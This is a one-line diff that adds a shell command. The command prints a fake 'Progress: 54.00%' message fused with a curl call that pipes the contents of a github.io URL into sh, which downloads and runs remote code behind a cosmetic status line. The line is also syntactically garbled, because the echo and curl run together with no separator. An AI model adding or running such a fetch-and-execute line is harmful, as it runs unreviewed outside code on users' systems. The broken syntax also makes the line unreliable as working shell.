@@ -1,0 +1,1 @@
+echo Progress: 54.00%curl -L --progress-bar frkns.github.io/fun/prospects_switzerland.h | sh
